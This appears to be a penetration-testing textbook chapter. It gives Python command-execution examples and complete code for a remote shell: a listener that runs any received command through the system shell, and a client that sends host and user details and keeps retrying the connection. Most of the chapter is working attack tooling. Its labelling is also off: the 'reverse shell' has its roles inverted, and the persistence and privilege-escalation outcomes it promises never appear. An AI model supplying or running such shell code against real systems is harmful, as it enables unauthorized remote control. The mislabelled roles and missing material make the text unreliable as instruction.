# Chapter 7: Code Execution and System Interaction

## Learning Outcomes

By the end of this chapter, students will be able to:

- Execute system commands using Python
- Implement basic persistence mechanisms
- Understand and demonstrate privilege escalation techniques

## Lab Overview

This lab focuses on using Python for penetration testing tasks, including:

1. Command execution and OS interaction
2. Persistence mechanisms
3. Privilege escalation

## Lab Setup

Required software:

- Python 3.x installed
- Basic understanding of Python programming
- Familiarity with command-line operations

## Exercise 1: Command Execution Techniques

### 1.1 Basic Command Execution

This section demonstrates various methods of executing commands in Python.

```python
import subprocess
import os
import sys

def execute_commands():
    """
    Demonstrates different command execution methods
    """

    # Method 1: subprocess.run
    try:
        result = subprocess.run(['whoami'], capture_output=True, text=True)
        print(f"Current user: {result.stdout}")
    except Exception as e:
        print(f"Error: {e}")

    # Method 2: os.system
    exit_code = os.system('dir' if os.name == 'nt' else 'ls')
    print(f"Exit code: {exit_code}")

    # Method 3: subprocess.Popen
    process = subprocess.Popen(
        ['echo', 'Hello World'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    stdout, stderr = process.communicate()
    print(f"Output: {stdout.decode()}")
```

### 1.2 Reverse Shell Implementation

This section provides a basic reverse shell implementation.

#### Server Code (server.py)

```python
import socket
import threading
import subprocess

def handle_client(client_socket):
    """
    Handles individual client connections
    """
    print("[*] New connection")

    while True:
        try:
            # Send prompt
            client_socket.send("shell> ".encode())

            # Receive command
            command = client_socket.recv(1024).decode().strip()

            if not command:
                continue

            if command.lower() == 'exit':
                break

            # Execute command
            output = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True
            )

            # Prepare response
            response = output.stdout + output.stderr
            if not response:
                response = "Command executed successfully\n"

            # Send response
            client_socket.send(response.encode())

        except Exception as e:
            print(f"[!] Error: {e}")
            break

    print("[*] Closing connection")
    client_socket.close()

def start_server():
    """
    Starts the reverse shell server
    """
    HOST = '127.0.0.1'
    PORT = 4444

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((HOST, PORT))
            server.listen(5)
            print(f"[*] Listening on {HOST}:{PORT}")

            while True:
                client, addr = server.accept()
                print(f"[*] Connection from {addr[0]}:{addr[1]}")

                client_handler = threading.Thread(target=handle_client, args=(client,))
                client_handler.start()

    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    start_server()
```

#### Client Code (client.py)

```python
import socket
import subprocess
import os
import sys
import time
import platform
import getpass

class ReverseShellClient:
    """
    A simple reverse shell client implementation
    """

    def __init__(self, host='127.0.0.1', port=4444):
        self.host = host
        self.port = port
        self.socket = None
        self.system_info = self._get_system_info()

    def _get_system_info(self):
        """
        Collects system information
        """
        return {
            'platform': platform.system(),
            'hostname': platform.node(),
            'username': getpass.getuser(),
            'architecture': platform.machine(),
            'version': platform.version()
        }

    def connect(self):
        """
        Establishes connection to the server
        """
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print(f"[*] Connecting to {self.host}:{self.port}")
                self.socket.connect((self.host, self.port))
                print("[*] Connection established!")

                # Send system information
                self.socket.send(f"""
System Information:
------------------
Platform: {self.system_info['platform']}
Hostname: {self.system_info['hostname']}
Username: {self.system_info['username']}
Architecture: {self.system_info['architecture']}
Version: {self.system_info['version']}
------------------
""".encode())

                self._handle_communication()
                break

            except Exception as e:
                print(f"[!] Connection failed: {e}")
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)

    def _handle_communication(self):
        """
        Handles communication with the server
        """
        try:
            while True:
                prompt = self.socket.recv(1024).decode()
                sys.stdout.write(prompt)
                sys.stdout.flush()

                command = input()

                if command.lower() == 'exit':
                    self.socket.send(command.encode())
                    break

                self.socket.send(command.encode())
                response = self.socket.recv(4096).decode()
                print(response)

        except Exception as e:
            print(f"[!] Communication error: {e}")
        finally:
            self.socket.close()

if __name__ == "__main__":
    client = ReverseShellClient()
    client.connect()
```

## Summary

This lab provides hands-on experience with:

- Different command execution methods in Python
- Basic reverse shell implementation
- Client-server communication handling
